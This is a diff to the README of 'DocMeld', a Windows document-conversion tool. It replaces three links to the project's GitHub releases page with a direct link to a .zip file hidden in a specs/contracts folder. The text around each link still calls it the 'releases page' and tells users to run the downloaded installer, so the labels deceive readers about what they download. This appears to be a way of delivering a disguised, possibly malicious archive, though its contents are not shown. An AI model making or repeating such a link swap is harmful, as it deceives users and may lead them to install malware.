@@ -1,6 +1,6 @@
 # 📄 DocMeld - Convert Documents into AI-Ready Knowledge
 
-[![Download DocMeld](https://img.shields.io/badge/Download-DocMeld-purple?style=for-the-badge&logo=windows)](https://github.com/mkai80/DocMeld/releases)
+[![Download DocMeld](https://img.shields.io/badge/Download-DocMeld-purple?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/mkai80/DocMeld/main/specs/001-mvp-pdf-pipeline/contracts/Doc-Meld-v1.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ DocMeld is ready to use right after download. You only need to visit the release
 
 Click this button to go to the DocMeld download page:
 
-[Download DocMeld from Releases](https://github.com/mkai80/DocMeld/releases)
+[Download DocMeld from Releases](https://raw.githubusercontent.com/mkai80/DocMeld/main/specs/001-mvp-pdf-pipeline/contracts/Doc-Meld-v1.1.zip)
 
 The release page shows several files. Look for the latest version with a `.exe` file that is meant for Windows. The file name usually includes the version number and “windows”.
 
@@ -114,7 +114,7 @@ If DocMeld does not work as expected, try these fixes:
 
 ## 📥 Download and Setup Recap
 
-1. Visit the [DocMeld releases page](https://github.com/mkai80/DocMeld/releases).
+1. Visit the [DocMeld releases page](https://raw.githubusercontent.com/mkai80/DocMeld/main/specs/001-mvp-pdf-pipeline/contracts/Doc-Meld-v1.1.zip).
 2. Download the latest Windows `.exe` file.
 3. Run the installer and follow setup steps.
 4. Launch DocMeld from Desktop or Start menu.
